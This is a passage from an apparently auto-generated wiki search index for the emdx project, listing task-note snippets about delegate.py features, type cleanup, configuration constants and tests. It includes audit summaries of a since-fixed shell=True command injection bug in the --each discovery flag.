examples</li> <li> <p>Add...</p> </li> <li> <p>#6829 Delegate: --help [2/2]   Section: Summary</p> </li> <li>Removed <code>help=</code> from <code>typer.Typer()</code>: The help text is now derived from the callback's docstring, which is richer and includes usage examples</li> <li> <p>*...</p> </li> <li> <p>#6827 Delegate: --help [2/2]   Section: Summary</p> <p>The <code>delegate --help</code> changes in <code>emdx/commands/delegate.py</code> are clean and working:</p> </li> <li> <p>#6795 Delegate: --help [2/2]</p> <ul> <li>Commit: <code>81cce93</code> \u2014 <code>feat: improve delegate --help with rich markup and grouped panels (Issue #1149)</code></li> </ul> </li> <li>Files changed: <code>emdx/commands/delegate.py</code> (106 lines), <code>emdx/utils/lazy_group.py</code> (+5 lines)</li> <li> <p>Lint: All checks passed</p> </li> <li> <p>#6788 Delegate: --help [2/2]</p> <p>Summary of changes in <code>emdx/commands/delegate.py</code>:</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p><code>emdx/commands/delegate.py</code>:</p> </li> <li>Replaced the long docstring with a <code>_DELEGATE_HELP</code> constant using Rich markup (examples with <code>[dim]</code>, <code>[bold]</code>)</li> <li> <p>Enabled <code>rich_markup_mode=\"rich\"</code> on the Typ...</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> </li> <li>Added <code>rich_markup_mode=\"rich\"</code> to the delegate Typer app for proper Rich-formatted help output</li> <li> <p>Added full help text (<code>_DELEGATE_HELP</code>) with a descripti...</p> </li> <li> <p>#6784 Delegate: --help [2/2]   Section: Changes Summary</p> </li> <li>Extracted help text to <code>_DELEGATE_HELP</code> \u2014 full Rich-formatted help with examples section</li> <li> <p>Enabled <code>rich_markup_mode=\"rich\"</code> \u2014 Typer renders <code>[bold]</code>, `...</p> </li> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...mdx delegate<code>| | PY_FILE | 173 |</code>delegate.py<code>,</code>tasks.py<code>| | FILE_PATH | 115 |</code>emdx/commands/delegate.py<code>| | FUNC_CALL | 53 |</code>_run_discovery()<code>,</code>shlex.split()<code>| | CLI_FLAG | 27 |</code>--each<code>,</code>--json<code>| | SUMMARY_NOISE | 12 |</code>summary fixed<code>,</code>summary added` | | TYPE_A...</p> </li> <li> <p>#6692 FEAT-12: Add --retry flag to delegate   Section: Changes (3 files, +443/-26 lines):</p> <p><code>emdx/commands/delegate.py</code> \u2014 Core implementation:</p> </li> <li>Added <code>--retry N</code> / <code>-r N</code> flag (default 0) to the <code>delegate()</code> command</li> <li> <p>Added retry constants: <code>RETRY_BACKOFF_BASE=2s</code>, `RETRY_BACKOFF_...</p> </li> <li> <p>#6575 Delegate: Add a one-line comment above _print_doc_content in delegate.   Section: Delegate: Add Comment Above _print_doc_content</p> </li> <li> <p>#6570 Delegate: Analyze the output capture and auto-save fallback in emdx/co [1/3]   Section: Executive Summary</p> <p>This document traces the exact flow of output capture in <code>emdx/commands/delegate.py</code> and analyzes when the auto-save fallback triggers. Critically, I've identified a potential duplicate content scenario where the fallback could produce duplicate...</p> </li> <li> <p>#6568 Delegate: Review the synthesis prompt construction in _run_parallel \u2014  [2/3]   Section: Overview</p> <p>I traced the synthesis prompt construction in <code>_run_parallel</code> (lines 636-861 of <code>emdx/commands/delegate.py</code>) to identify any paths where content could be doubled.</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Overview</p> <p>Location: <code>emdx/commands/delegate.py</code> (~1184 lines)</p> </li> <li> <p>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con   Section: Files Changed</p> <ul> <li><code>emdx/commands/types.py</code> (new, 259 lines)</li> </ul> </li> <li><code>emdx/commands/prime.py</code> (modified)</li> <li><code>emdx/commands/analyze.py</code> (modified)</li> <li> <p><code>emdx/commands/delegate.py</code> (modified)</p> </li> <li> <p>#6559 Delegate: Document #6543 (Delegate Enhancement Gameplans [2/5]):</p> </li> </ul>"},{"location":"entities/emdxcommandsdelegatepy/#1-emdxcommandsdelegatepy-subcommand-routing-fix_1","title":"1. <code>emdx/commands/delegate.py</code> \u2014 Subcommand routing fix","text":""},{"location":"entities/emdxcommandsdelegatepy/#2-emdxcommandsdelegatepy-two-fixes","title":"2. <code>emdx/commands/delegate.py</code> \u2014 Two fixes:","text":""},{"location":"entities/emdxcommandsdelegatepy/#emdxcommandsdelegatepy_2","title":"<code>emdx/commands/delegate.py</code>","text":""},{"location":"entities/emdxcommandsdelegatepy/#emdxcommandsdelegatepy_3","title":"<code>emdx/commands/delegate.py</code>","text":""},{"location":"entities/emdxcommandsdelegatepy/#changes-made","title":"Changes Made","text":"<p>Added a comment at line 406 in <code>emdx/commands/delegate.py</code>:</p>"},{"location":"entities/emdxcommandsdelegatepy/#im","title":"Im","text":"<p>Section: Changes Made</p> <ul> <li>#6556 Delegate: --memory N flag implementation </li> </ul>"},{"location":"entities/emdxcommandsdelegatepy/#2-emdxcommandsdelegatepy","title":"2. <code>emdx/commands/delegate.py</code>","text":"<ul> <li>Added <code>--retry/-r</code> flag to CLI (0-10 attempts, default 0)</li> <li>Added <code>max_retries</code> parameter to <code>_run_single()</code> function</li> <li>Implemented retry loop with exponential ba...</li> </ul>"},{"location":"entities/emdxcommandsdelegatepy/#changes-made_1","title":"Changes Made","text":""},{"location":"entities/emdxcommandsdelegatepy/#1-new-functions-in-emdxcommandsdelegatepy","title":"1. New Functions in <code>emdx/commands/delegate.py</code>","text":"<p><code>_format_time_ago(dt_str: str) -&gt; str</code> (lines 406-428) - Formats a datetime string as a relative time (\"30m ago\", \"5h ago\", \"2d ago\") - Uses the centralized <code>parse_datetime</code> ut...</p> <ul> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]   Section: 1. CLI Flag Definition</p> <p>File: <code>emdx/commands/delegate.py</code></p> </li> <li> <p>#6541 Delegate Enhancement Gameplans [3/5]   Section: 1. New Function: <code>_get_memory_context()</code></p> <p>Location: <code>emdx/commands/delegate.py</code> (add after line ~405, near <code>_load_doc_context()</code>)</p> </li> <li> <p>#6540 Delegate: Fix issues found in PR #652 review (doc #6529 in emdx KB). T [3/3]   Section: 2. Wire up --timeout flag in recipe execution</p> <p>Files:</p> </li> <li><code>emdx/commands/delegate.py</code>: Added <code>timeout: int | None = None</code> parameter to <code>_run_single()</code> function and updated <code>ExecutionConfig</code> creation to use the custom timeout when provided</li> <li> <p>`emdx/ser...</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts   Section: Files with intentional <code>Any</code> usage (unchanged)</p> <ul> <li><code>emdx/commands/delegate.py</code>: <code>**kwargs: Any</code> in <code>_safe_create_task</code>, <code>_safe_update_task</code>, <code>_safe_update_execution</code> - forwards to typed functions</li> </ul> </li> <li> <p><code>emdx/models/tasks.py</code>: `update_task(ta...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: Critical Bugs (5)</p> <p>File: <code>emdx/commands/delegate.py</code></p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: Summary</p> File Any Count Fixable Notes <code>emdx/commands/delegate.py</code> 3 3 **kwargs patterns <code>emdx/commands/compact.py</code> 8 6 sklearn matrix + dict patterns <code>emdx/commands/distill.py</code> 5 4 Audience enum + dict pa... </li> <li> <p>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: Files Changed</p> <ol> <li><code>emdx/commands/delegate.py</code>:</li> </ol> </li> <li>Imported <code>generate_delegate_branch_name</code> from utils.git</li> <li>Removed redundant <code>_slugify_title()</code> function (replaced with centralized version)</li> <li> <p>Updated...</p> </li> <li> <p>#6482 Delegate: Kink 6: Add basic PR validation to emdx/commands/delegate.py [3/3]   Section: Summary</p> <p>Added basic PR validation to <code>emdx/commands/delegate.py</code> that runs before creating a PR via <code>gh</code>. The validation checks:</p> </li> <li> <p>#6481 Delegate: Kink 4: Make delegate --synthesize resilient to agent failur [1/3]   Section: Solution</p> <p>Modified <code>emdx/commands/delegate.py</code> to handle partial failures gracefully:</p> </li> <li> <p>#6480 Delegate: List the top 5 most important files in the emdx project and    Section: Top 5 Most Important Files in the EMDX Project</p> </li> <li> <p>#6469 Centralized Configuration Constants for EMDX   Section: Updated Files</p> <p>...e Command Files</p> </li> <li><code>emdx/commands/cascade.py</code> - Uses CASCADE_*_TIMEOUT constants</li> <li><code>emdx/commands/delegate.py</code> - Uses DELEGATE_TIMEOUT_SECONDS, DISCOVERY_TIMEOUT_SECONDS</li> <li><code>emdx/commands/gist.py</code> - Uses GITHUB_AUTH_TIMEOUT</li> <li> <p><code>emdx/commands/maintain.py</code> - Uses PROCESS_*_TIMEO...</p> </li> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (function <code>_run_discovery</code>)</p> </li> <li> <p>#6465 Security Audit and Fixes: EMDX Command Injection Vulnerability   Section: Vulnerability Details</p> </li> <li>File: <code>emdx/commands/delegate.py</code></li> <li>Function: <code>_run_discovery()</code> (line 141-166)</li> <li> <p>Severity: HIGH/CRITICAL</p> </li> <li> <p>#6442 Delegate: Fix draft default mismatch in internal functions   Section: Files Changed</p> <ul> <li><code>emdx/commands/delegate.py</code> - Three one-line fixes to align internal function defaults with CLI default</li> </ul> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: 4. ALLOWED_COLUMNS Whitelists - \u26a0\ufe0f INCOMPLETE</p> <p>But <code>error</code> is actively used in <code>emdx/commands/delegate.py</code>: ```python _safe_update_task(task_id, status=\"failed\", error=result.error_message)  # line 341 _safe_update_task(parent_task_id, status=\"failed\", error=\"no output d...</p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Task 1: Add <code>--draft</code> flag to delegate command</p> <p>File: <code>emdx/commands/delegate.py</code></p> </li> <li> <p>#6351 Delegate: Analyze upgrading typer from ^0.15.0 to ^0.23.1 for the emdx [1/2]   Section: 5. Files to Monitor During Upgrade</p> </li> <li><code>emdx/commands/core.py</code> - 20+ Option/Argument definitions</li> <li><code>emdx/commands/delegate.py</code> - Complex callback with many options</li> <li> <p><code>emdx/commands/cascade.py</code> - Multi-command app</p> </li> <li> <p>#6342 Delegate: Document #6330 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/emdxcommandsdelegatepy/#4-emdxcommandsdelegatepy","title":"4. <code>emdx/commands/delegate.py</code>","text":"<p>The primary AI execution command that enables task delegation to Claude agents with parallel execution, chaining, worktree isolation, PR creation, and automatic result persistence to the knowledge base.</p>"},{"location":"entities/emdxcommandsdelegatepy/#location","title":"Location","text":""},{"location":"entities/emdxcommandsdelegatepy/#medium-heavy-typer-usage","title":"Medium (heavy Typer usage):","text":""},{"location":"entities/emdxcommandsdelegatepy/#emdx-arc-212","title":"EMDX Arc [2/12]","text":"<p>Section: Changes Made</p> <p>...ommands/prime.py<code>- get_git_project -</code>emdx/commands/core.py<code>- get_git_project -</code>emdx/commands/delegate.py<code>(4 locations) - create_worktree_simple, cleanup_worktree -</code>emdx/ui/activity/activity_view.py<code>- get_git_project -</code>emdx/ui/document_browser.py` - get_git_project -...</p> <ul> <li> <p>#6320 Delegate: Add comprehensive test coverage for the delegate command (em   Section: Comprehensive Test Coverage for Delegate Command</p> </li> <li> <p>#6303 Delegate: DEBT-10 RETRY: Fix type safety debt in the emdx project. Foc   Section: Functions with Return Type Annotations</p> <p>emdx/commands/delegate.py:</p> </li> <li><code>_safe_create_task()</code> \u2192 <code>int | None</code></li> <li><code>_safe_update_task()</code> \u2192 <code>None</code></li> <li><code>_safe_update_execution()</code> \u2192 <code>None</code></li> <li><code>_run_discovery()</code> \u2192 <code>list[str]</code></li> <li> <p>`_load_doc_cont...</p> </li> <li> <p>#6294 DEBT-19: Add missing test coverage for delegate command   Section: DEBT-19: Add missing test coverage for delegate command</p> </li> <li> <p>#6284 Delegate: DEBT-7: Centralize configuration   Section: Changes Made</p> <p>...pdated (13 files)</p> </li> <li><code>emdx/commands/cascade.py</code> - Uses CASCADE_*_TIMEOUT_SECONDS</li> <li><code>emdx/commands/delegate.py</code> - Uses DELEGATE_TIMEOUT_SECONDS, DISCOVERY_TIMEOUT_SECONDS</li> <li><code>emdx/commands/gist.py</code> - Uses AUTH_CHECK_TIMEOUT_SECONDS</li> <li> <p><code>emdx/config/__init__.py</code> - Exports all new...</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]   Section: Files Changed</p> <ul> <li><code>emdx/commands/delegate.py</code> - Security fix (+79 lines)</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code> - Security tests (+142 lines)</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 4. Files Updated to Use Centralized Constants</p> <ul> <li><code>emdx/commands/cascade.py</code> - Uses <code>CASCADE_*_TIMEOUT</code></li> </ul> </li> <li><code>emdx/commands/delegate.py</code> - Uses <code>DISCOVERY_COMMAND_TIMEOUT</code></li> <li><code>emdx/commands/gist.py</code> - Uses <code>GITHUB_AUTH_TIMEOUT</code></li> <li><code>emdx/commands/maintain.py</code> - Uses <code>PROCESS_*_TIMEOUT</code></li> <li> <p>`emdx/config/cl...</p> </li> <li> <p>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37]   Section: Summary</p> <p>Fixed CRITICAL command injection vulnerability in the <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code>.</p> </li> <li> <p>#6266 Delegate: Document #6230 (Delegate: Audit CONFIGURATION DEBT in the emdx project)   Section: Files Modified</p> <p>...tralized models)</p> </li> <li><code>emdx/services/ask_service.py</code> (use centralized constants)</li> <li><code>emdx/commands/delegate.py</code> (use timeout/branch constants)</li> <li><code>emdx/utils/git.py</code> (add get_default_branch())</li> <li><code>emdx/commands/core.py</code> (use DEFAULT_EDITOR)</li> <li> <p><code>emdx/main.py</code> (use BOOL_TRUTHY_...</p> </li> <li> <p>#6262 Delegate: Audit API/INTERFACE DEBT in the emdx CLI [3/14]   Section: Files Modified</p> <p>...rdized error messages</p> </li> <li><code>emdx/commands/core.py</code>: Added empty content validation</li> <li><code>emdx/commands/delegate.py</code>: Added --verbose flag with module-level tracking, improved help text</li> <li><code>emdx/commands/executions.py</code>: Added help text</li> <li><code>emdx/commands/gist.py</code>: Added help text</li> <li> <p>`...</p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Vulnerability</p> <p>The <code>_run_discovery()</code> function in <code>emdx/commands/delegate.py</code> was using <code>shell=True</code> with user input from the <code>--each</code> flag:</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Issue</p> <p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> used <code>shell=True</code> with user-provided input:</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Files Modified</p> <ul> <li><code>emdx/commands/delegate.py</code> - Security fix implementation</li> </ul> </li> <li> <p><code>tests/test_commands_delegate.py</code> - 31 new security tests</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> </li> <li><code>emdx/commands/delegate.py</code>: +84 lines (validation + secure execution)</li> <li> <p><code>tests/test_commands_delegate.py</code>: +165 lines (security tests)</p> </li> <li> <p>#6245 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37]   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (<code>_run_discovery</code> function)</p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: Summary</p> <p>Fixed a CRITICAL command injection vulnerability in <code>emdx/commands/delegate.py</code> where the <code>--each</code> flag passed user input directly to a shell via <code>subprocess.run(command, shell=True)</code>.</p> </li> <li> <p>#6241 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (<code>_run_discovery()</code> function) Severity: HIGH Issue: The <code>--each</code> flag passed user input directly to a shell via <code>shell=True</code>, allowing command injection attacks.</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Fix Applied</p> </li> <li><code>emdx/commands/delegate.py</code>: Added <code>_validate_discovery_command()</code> and allowlist</li> <li> <p><code>tests/test_commands_delegate.py</code>: Added 19 security tests</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 6. DUPLICATE IMPORTS (Code Quality)</p> <p>...: <code>Progress</code>, <code>SpinnerColumn</code>, <code>TextColumn</code>, <code>psutil</code>, <code>get_running_executions</code></p> </li> <li><code>emdx/commands/delegate.py</code> - Duplicates: <code>create_worktree</code>, <code>cleanup_worktree</code></li> <li><code>emdx/commands/gist.py</code> - Duplicates: <code>tempfile</code></li> <li> <p><code>emdx/services/claude_executor.py</code> - Duplicates: `get_subpr...</p> </li> <li> <p>#6227 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: 1. <code>except Exception: pass</code> - Complete Silent Failures (31 instances)</p> File Line Context <code>emdx/commands/delegate.py</code> 64-65 <code>_safe_update_task</code> - silently ignores task update failures <code>emdx/commands/delegate.py</code> 75-76 <code>_safe_update_execution</code> - silently ignores executio... </li> <li> <p>#6220 Delegate: Audit ERROR HANDLING DEBT in the emdx project: Find bare exc [8/14]   Section: \ud83d\udd34 CRITICAL: Silent Failures (except: pass)</p> File Line Context Severity <code>emdx/commands/delegate.py</code> 64-65 <code>_safe_update_task()</code> - task updates silently fail HIGH <code>emdx/commands/delegate.py</code> 75-76 <code>_safe_update_execution()</code> - execution updates silentl... </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: delegate.py - Execution Creation Flow</p> <p>Location: <code>emdx/commands/delegate.py</code></p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Integration with Delegate Command</p> <p>The <code>emdx delegate</code> command (<code>emdx/commands/delegate.py</code>) is the primary interface for AI task execution:</p> </li> <li> <p>#6425 Delegate: Task #594: Add --draft flag to emdx delegate --pr   Section: Changes Made</p> <ol> <li>emdx/commands/delegate.py:</li> </ol> </li> <li>Added <code>--draft/--no-draft</code> CLI option to <code>delegate()</code> function (default: True)</li> <li> <p>Updated <code>_make_pr_instruction()</code> to accept <code>draft</code> parameter and include...</p> </li> <li> <p>#6341 Delegate: R4: Centralize configuration constants. Create emdx/constant   Section: Changes Made</p> </li> <li>emdx/commands/delegate.py - Uses DELEGATE_TIMEOUT_SECONDS and DISCOVERY_TIMEOUT_SECONDS</li> <li>emdx/services/unified_executor.py - Uses DEFAULT_CLI_TIMEOUT_SECONDS</li> <li> <p>**emdx/services/cascad...</p> </li> <li> <p>#6280 Delegate: DEBT-5: Fix silent exception handlers   Section: Files Modified</p> </li> <li>emdx/commands/delegate.py (lines 64-65, 75-76)</li> <li>Added <code>import logging</code> and <code>logger = logging.getLogger(__name__)</code></li> <li> <p><code>_safe_update_task</code>: Now logs failed task updates with task ID...</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Vulnerability</p> <p>File: <code>emdx/commands/delegate.py:144</code> Severity: HIGH</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: Files Changed</p> <ol> <li>emdx/commands/delegate.py</li> </ol> </li> <li>Added <code>shlex</code> import</li> <li>Added <code>SAFE_DISCOVERY_COMMANDS</code> frozenset allowlist</li> <li>Added <code>_validate_discovery_command()</code> function for security validation</li> <li>Modified <code>_run_discovery()</code> to use the new validation</li> </ul>"},{"location":"entities/emdxcommandsdelegatepy/#summary_1","title":"Summary","text":"<p>Added 56 comprehensive tests for <code>emdx/commands/delegate.py</code> in <code>tests/test_delegate_commands.py</code>.</p>"},{"location":"entities/emdxcommandsdelegatepy/#summary_2","title":"Summary","text":"<p>Added comprehensive test coverage for the <code>emdx/commands/delegate.py</code> module. The test file now contains 59 tests covering all major functionality.</p>"},{"location":"entities/emdxcommandsdelegatepy/#the-vulnerability-cve-worthy","title":"The Vulnerability (CVE-worthy)","text":"<p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/emdxcommandsdelegatepy/#files-changed","title":"Files Changed","text":""},{"location":"entities/emdxcommandsdelegatepy/#files-changed_1","title":"Files Changed","text":""},{"location":"entities/emdxcommandsdelegatepy/#files-updated-to-use-centralized-constants-top-10-call-sites","title":"Files Updated to Use Centralized Constants (Top 10 Call Sites):","text":""},{"location":"entities/emdxcommandsdelegatepy/#commands-database-operations-command-execution","title":"Commands (database operations, command execution)","text":""},{"location":"entities/emdxcommandsdelegatepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>tests/test_commands_delegate.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (15 shared docs, PMI=3.4)</li> <li><code>safe_discovery_commands</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=3.4)</li> <li><code>known_flags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=3.4)</li> <li><code>locate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.4)</li> <li><code>emdx delegate list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.4)</li> <li><code>emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (14 shared docs, PMI=3.3)</li> <li><code>_validate_discovery_command()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (11 shared docs, PMI=3.2)</li> <li><code>tests/test_delegate_commands.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=3.2)</li> <li><code>grep</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=3.2)</li> <li><code>emdx delegate --help</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=3.2)</li> </ul>"},{"location":"entities/emdxcommandsdelegatepy144/","title":"emdx/commands/delegate.py:144","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-14</p>"},{"location":"entities/emdxcommandsdelegatepy144/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6468 Security Fix Implementation for EMDX Delegate Command   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (function <code>_run_discovery</code>)</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Issue</p> <p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> used <code>shell=True</code> with user-provided input:</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Vulnerability</p> <p>File: <code>emdx/commands/delegate.py:144</code> Severity: HIGH</p> </li> <li> <p>#6245 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37]   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (<code>_run_discovery</code> function)</p> </li> <li> <p>#6242 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [8/37]   Section: Vulnerability</p> <p>File: <code>emdx/commands/delegate.py:144</code> Severity: HIGH</p> </li> <li> <p>#6241 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]   Section: Vulnerability Details</p> <p>Location: <code>emdx/commands/delegate.py:144</code> (<code>_run_discovery()</code> function) Severity: HIGH Issue: The <code>--each</code> flag passed user input directly to a shell via <code>shell=True</code>, allowing command injection attacks.</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> </li> <li>Location: <code>emdx/commands/delegate.py:144</code></li> <li>Issue: <code>shell=True</code> with user input in <code>--each</code> flag enables arbitrary command execution</li> <li> <p>Fix: Validate/restrict commands or use <code>shlex.split()</code> with `sh...</p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Findings</p> </li> </ul>"},{"location":"entities/emdxcommandsdelegatepy144/#the-vulnerability-cve-worthy","title":"The Vulnerability (CVE-worthy)","text":"<p>The <code>_run_discovery()</code> function at <code>emdx/commands/delegate.py:144</code> passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p>"},{"location":"entities/emdxcommandsdelegatepy144/#1-command-injection-vulnerability-security","title":"1. Command Injection Vulnerability (Security)","text":""},{"location":"entities/emdxcommandsdelegatepy144/#1-critical-command-injection-in-discovery-feature","title":"1. CRITICAL: Command Injection in Discovery Feature","text":"<p>File: <code>emdx/commands/delegate.py:144</code> Severity: HIGH</p>"},{"location":"entities/emdxcommandsdelegatepy144/#related-entities","title":"Related Entities","text":"<ul> <li><code>url:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>rg -l</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>remaining audit items</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>find . -name '*.py'</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>fd -e py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>complete</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>safe execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>curl</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>before (vulnerable)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/emdxcommandsdistillpy/","title":"emdx/commands/distill.py","text":"<p>Type: heading | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/emdxcommandsdistillpy/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...wrappers | | <code>emdx/commands/compact.py</code> | 7 | 5 | Similarity matrix is tricky | | <code>emdx/commands/distill.py</code> | 5 | 4 | Audience enum return is fine | | <code>emdx/commands/review.py</code> | 2 | 2 | Simple JSON serialization | | <code>emdx/models/tasks.py</code> | 2 | 2 | TaskDict fields | | `e...</p> </li> <li> <p>#6516 Any removal Phase 4: Command/Model TypedDicts</p> <p><code>emdx/commands/compact.py</code></p> </li> </ul> <p>Changes: - Added <code>TYPE_CHECKING</code> guard with numpy imports (<code>np</code>, <code>npt</code>) - Created <code>CompactDocumentDict</code> TypedDict for document data:   - <code>id: int</code>, <code>title: str</code>, <code>content: str</code>, <code>project: str | None</code>, `created_at: str ...</p> <ul> <li>#6509 Any Type Removal Analysis [synthesis]   Section: Files Changed by Priority <p>...ette_presenter.py` (4 occurrences)</p> </li> <li><code>emdx/commands/compact.py</code> (6 occurrences)</li> <li> <p><code>emdx/commands/distill.py</code> (4 occurrences)</p> </li> <li> <p>#6499 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...terns | | <code>emdx/commands/compact.py</code> | 8 | 6 | sklearn matrix + dict patterns | | <code>emdx/commands/distill.py</code> | 5 | 4 | Audience enum + dict patterns | | <code>emdx/commands/review.py</code> | 1 | 1 | JSON output | | <code>emdx/models/tasks.py</code> | 2 | 2 | **kwargs + dict pattern | | `emdx/m...</p> </li> <li> <p>#6467 emdx distill Command Implementation   Section: Core Components</p> <p>2. Distill Command (<code>emdx/commands/distill.py</code>)</p> </li> <li>Typer subcommand for the CLI interface</li> <li>Uses <code>@app.callback(invoke_without_command=True)</code> pattern for lazy loading</li> <li> <p>Supports both topic-based search (hybrid se...</p> </li> <li> <p>#6451 Implement emdx distill command   Section: 